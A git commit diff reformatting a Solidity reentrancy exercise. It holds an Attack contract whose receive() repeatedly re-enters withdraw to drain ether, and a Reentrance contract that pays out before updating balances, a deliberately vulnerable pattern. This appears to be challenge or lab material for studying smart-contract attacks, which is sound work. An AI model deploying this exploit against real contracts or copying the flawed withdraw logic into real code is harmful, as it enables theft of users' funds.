9b0a0be04c301440a8951eaef88786aeb88700de
Aayush Gupta <guptaaayush432@gmail.com>
2024-01-03 00:21:59 +0530

    Updated Reentrancy-10.sol

--- Reentrancy-10.sol
+++ Reentrancy-10.sol
@@ -3,55 +3,55 @@ pragma solidity ^0.6.12;
 
 import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/docs-v3.x/contracts/math/SafeMath.sol";
 
-interface IReentrance{
+interface IReentrance {
     function donate(address _to) external payable;
-    function withdraw(uint _amount) external;
+    function withdraw(uint256 _amount) external;
 }
 
-contract Attack{
+contract Attack {
     IReentrance reentrance;
 
     constructor(address _Reentrance) public {
         reentrance = IReentrance(_Reentrance);
     }
 
-    function steal() external payable{
-        reentrance.donate{value : msg.value}(address(this));
+    function steal() external payable {
+        reentrance.donate{value: msg.value}(address(this));
 
         reentrance.withdraw(msg.value);
     }
 
-    receive() external payable{
-        uint targetBalance = address(reentrance).balance;
+    receive() external payable {
+        uint256 targetBalance = address(reentrance).balance;
 
-        if(targetBalance >= 0.001 ether){
+        if (targetBalance >= 0.001 ether) {
             reentrance.withdraw(0.001 ether);
         }
-    } 
+    }
 }
 
 contract Reentrance {
-  
-  using SafeMath for uint256;
-  mapping(address => uint) public balances;
+    using SafeMath for uint256;
 
-  function donate(address _to) public payable {
-    balances[_to] = balances[_to].add(msg.value);
-  }
+    mapping(address => uint256) public balances;
 
-  function balanceOf(address _who) public view returns (uint balance) {
-    return balances[_who];
-  }
-
-  function withdraw(uint _amount) public {
-    if(balances[msg.sender] >= _amount) {
-      (bool result,) = msg.sender.call{value:_amount}("");
-      if(result) {
-        _amount;
-      }
-      balances[msg.sender] -= _amount;
+    function donate(address _to) public payable {
+        balances[_to] = balances[_to].add(msg.value);
     }
-  }
 
-  receive() external payable {}
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] >= _amount) {
+            (bool result,) = msg.sender.call{value: _amount}("");
+            if (result) {
+                _amount;
+            }
+            balances[msg.sender] -= _amount;
+        }
+    }
+
+    receive() external payable {}
 }
